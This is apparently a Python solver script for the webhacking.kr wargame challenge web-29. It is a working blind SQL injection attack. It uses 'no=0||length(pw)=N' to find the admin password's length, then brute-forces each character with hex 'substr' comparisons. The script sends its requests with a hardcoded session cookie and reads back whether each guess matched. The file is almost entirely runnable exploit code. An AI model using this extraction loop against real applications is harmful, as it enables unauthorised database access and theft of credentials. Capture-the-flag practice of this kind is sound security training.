import string
import requests

url="https://webhacking.kr/challenge/web-29/?"
cookie = {'PHPSESSID':"hjb4hev90d5u7q3ejvvgigllgq"}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        payload = "no=0||length(pw)={}&id=admin&pw=admin".format(pw_len)
        res = requests.get(url=url+payload, cookies=cookie)
        print(payload)
        if "admin password :" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len
    
def find_pw(pw_len):
    pw =''
    for i in range(1,pw_len+1):
        for j in string.printable:
            k = hex(ord(j)).split("0x")[1]
            payload = "no=0||substr(pw,{},1)=0x{}&id=admin&pw=admin".format(i,k)
            res = requests.get(url=url+payload, cookies=cookie)
            print(payload)
            if "admin password :" in res.text:
                pw += j
                print(pw)
                break
    print("PASSWORD : " + pw)

if __name__ == "__main__":
    pw_len = pw_length()
    find_pw(pw_len)